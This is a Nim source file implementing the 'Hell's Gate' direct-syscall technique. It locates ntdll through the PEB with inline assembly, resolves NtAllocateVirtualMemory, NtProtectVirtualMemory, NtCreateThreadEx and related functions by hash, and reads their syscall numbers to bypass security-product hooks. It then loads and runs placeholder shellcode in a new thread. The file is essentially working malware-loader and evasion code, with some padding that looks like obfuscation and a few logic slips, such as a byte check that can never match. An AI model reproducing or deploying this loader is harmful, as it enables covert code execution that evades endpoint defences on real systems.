import winim

import ../hash
import ./[stubs]

type
  VX_TABLE_ENTRY* = object
    pAddress*: PVOID
    dwHash*: uint32
    wSystemCall*: WORD
  PVX_TABLE_ENTRY* = ptr VX_TABLE_ENTRY

  VX_TABLE* = object
    NtQueryInformationProcess*: VX_TABLE_ENTRY
    NtAllocateVirtualMemory*: VX_TABLE_ENTRY
    NtProtectVirtualMemory*: VX_TABLE_ENTRY
    NtCreateThreadEx*: VX_TABLE_ENTRY
    NtWaitForSingleObject*: VX_TABLE_ENTRY
  PVX_TABLE* = ptr VX_TABLE

proc getPPEB(): winim.PPEB {.asmNoStackFrame, inline.}= 
  asm """
    xor rax, rax
    mov rax, 0x10
    imul rax, rax, 6
    mov rax, qword ptr gs:[rax]
    ret
  """

template testJmpFail[T](t: T) =
  if cast[int](t) == 0:
    asm "jmp FAILURE"

template testJmpFail2[T](t: T) =
  if cast[int](t) == 0:
    asm "jmp FAILURE2"

template testJmpFail3[T](t: T) =
  if cast[int](t) == 0:
    asm "jmp FAILURE3"

proc getVxTableEntry(pModuleBase: PVOID, pImageExportDirectory: PIMAGE_EXPORT_DIRECTORY, pVxTableEntry: PVX_TABLE_ENTRY): bool =
  var pdwAddressOfFunctions = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfFunctions)
  testJmpFail(pdwAddressOfFunctions)
  var pdwAddressOfNames = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNames)
  testJmpFail(pdwAddressOfNames)
  var pwAddressOfNameOrdinals = cast[ptr UncheckedArray[WORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNameOrdinals)
  testJmpFail(pwAddressOfNameOrdinals)
  var bResult = false
  
  for i in 0 ..< pImageExportDirectory.NumberOfNames:
    var pczFunctionName = cast[PCHAR](cast[int](pModuleBase) + pdwAddressOfNames[i])
    testJmpFail(pczFunctionName)
    var pFunctionAddress = cast[PBYTE](cast[int](pModuleBase) + pdwAddressOfFunctions[pwAddressOfNameOrdinals[i]])
    testJmpFail(pFunctionAddress)
    if hashStrA(cast[cstring](pczFunctionName)) == pVxTableEntry.dwHash:
      pVxTableEntry.pAddress = pFunctionAddress

      # check if function has been hooked
      var j = 0
      while true:
        # check if syscall, if this case we are too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x0f.byte) and (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x05.byte):
          testJmpFail(0)
        # check if ret, in this care we are probably too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0xc3.byte):
          testJmpFail(0)

        #[
          First opcodes should be:
            mov r10, rcx
            mov rcx, <syscall>
        ]#
        if (cast[PBYTE](cast[int](pFunctionAddress) + j + 0)[] == 0x4c) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 1)[] == 0x8b) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 2)[] == 0xd1) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 3)[] == 0xb8) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 6)[] == 0x00) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 7)[] == 0x00):
          # get high and low bytes and set them in our table
          var 
            h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + j)[]
            l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + j)[]
          pVxTableEntry.wSystemCall = ((h shl 8) or l)
          break
        j.inc
  bResult = true

  asm "FAILURE:"
  return bResult

proc getImageExportDirectory(pModuleBase: PVOID): PIMAGE_EXPORT_DIRECTORY =
  var r = cast[PIMAGE_EXPORT_DIRECTORY](0)
  var pImgDosHdr = cast[PIMAGE_DOS_HEADER](pModuleBase)
  testJmpFail2(pImgDosHdr)
  var pImgNtHdrs = cast[PIMAGE_NT_HEADERS](cast[int](pModuleBase) + pImgDosHdr.e_lfanew + 420)
  testJmpFail2(pImgNtHdrs)
  pImgNtHdrs = cast[PIMAGE_NT_HEADERS](cast[int](pImgNtHdrs) - 420)
  testJmpFail2(pImgNtHdrs)
  var t1 = pImgDosHdr.e_magic + 420
  var t2 = pImgNtHdrs.Signature + 420
  # if (t1 != IMAGE_DOS_SIGNATURE + 420) or (t2 != IMAGE_NT_SIGNATURE + 420):
  #   testJmpFail2(0)
  var pImgExportDirectory = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](pModuleBase) + pImgNtHdrs.OptionalHeader.DataDirectory[0].VirtualAddress)
  testJmpFail2(pImgExportDirectory)
  r = pImgExportDirectory
  asm "FAILURE2:"
  return r


proc initHG*(t: PVX_TABLE): bool = 
  var pPeb = getPPEB()
  testJmpFail3(pPeb)
  var a = cast[int](pPeb.Ldr)
  testJmpFail3(a)
  var b = cast[int](cast[PPEB_LDR_DATA](a).InMemoryOrderModuleList)
  testJmpFail3(b)
  var c = cast[int](cast[LIST_ENTRY](b).Flink)
  testJmpFail3(c)
  var d = cast[int](cast[ptr LIST_ENTRY](c).Flink)
  testJmpFail3(d)
  # NTDLL module
  var pLdrDataEntry = cast[PLDR_DATA_TABLE_ENTRY](d - 0x10)

  # EAT of NTDLL
  var pImageExportDirectory = getImageExportDirectory(pLdrDataEntry.DllBase)
  if cast[int](pImageExportDirectory) == 0:
    asm "FAILURE3:"
    return false

  t.NtQueryInformationProcess.dwHash = static(hashStrA("NtQueryInformationProcess"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtQueryInformationProcess): 
    return false
  
  t.NtAllocateVirtualMemory.dwHash = static(hashStrA("NtAllocateVirtualMemory"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtAllocateVirtualMemory): 
    return false

  t.NtCreateThreadEx.dwHash = static(hashStrA("NtCreateThreadEx"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtCreateThreadEx): 
    return false

  t.NtProtectVirtualMemory.dwHash = static(hashStrA("NtProtectVirtualMemory"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtProtectVirtualMemory): 
    return false

  t.NtWaitForSingleObject.dwHash = static(hashStrA("NtWaitForSingleObject"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtWaitForSingleObject): 
    return false
  
  return true

proc triggerPayload(t: PVX_TABLE): bool =
  var
    sc = "\x90\x90\xcc\x90\x90\x90\xcc\xcc\xcc\xc3\xeb\xef".cstring
    status: NTSTATUS = 0
    lpAddress: LPVOID = NULL
    scLen: SIZE_T = sizeof(sc)
    ulOldProtect: ULONG
  
  # allocate memory for the shellcode
  HellsGate(t.NtAllocateVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), lpAddress.addr, 0, &scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if status != 0:
    return false

  # write memory
  copyMem(lpAddress, sc[0].addr, sizeof(sc))

  # change page permissions
  HellsGate(t.NtProtectVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), lpAddress.addr, scLen.addr, PAGE_EXECUTE_READ, ulOldProtect.addr)
  if status != 0:
    return false

  # create thread
  var hThread: HANDLE = INVALID_HANDLE_VALUE
  HellsGate(t.NtCreateThreadEx.wSystemCall)
  status = HellsDescent(hThread.addr, 0x1FFFFF, NULL, -1, lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL)
  if status != 0:
    return false

  # wait for X seconds
  var timeout: LARGE_INTEGER
  timeout.QuadPart = -100000
  HellsGate(t.NtWaitForSingleObject.wSystemCall)
  status = HellsDescent(hThread, FALSE, timeout.addr)
  if status != 0:
    return false

  return true